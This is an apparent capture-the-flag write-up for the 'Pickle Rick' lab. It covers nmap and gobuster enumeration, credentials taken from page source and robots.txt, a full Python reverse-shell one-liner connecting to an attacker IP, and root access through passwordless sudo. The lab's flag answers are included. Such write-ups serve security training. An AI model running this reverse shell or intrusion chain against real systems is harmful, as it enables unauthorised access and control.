# Pickle rick

- Used nmap to scan for ports on the server.
- There is apache running on port 80
- Found a username in the website source code.
```
 Username: R1ckRul3s
```
- Found a text in robots.txt
```
Wubbalubbadubdub
```
- Run gobuster to search for hidden directories and files
```
gobuster dir -u http://10.10.141.70:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,css,html,py,sh,cfg
```
- Found `login.php` and `portal.php`
- username for login.php is `R1ckRul3s` and password is `Wubbalubbadubdub`
- It opened a command panel where cat doesnt work
- Use `git diff` or `grep .` to read the files
- found the first ingredient `mr. meeseek hair`
- Found the second ingredient in the `/home/rick`: `1 jerry tear`
- Python is executable on the command panel so we will try getting a reverse shell on the server. Get a python oneline for the reverse shell
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.73.202",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
``` 

Reverse shell cheat sheet link : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python

- Use pwncat to get a stable reverse shell and upload linpeas.sh
- There is not password for sudo, so just do sudo bash and now we own the machine
- The third ingredient is in /root/3rd.txt
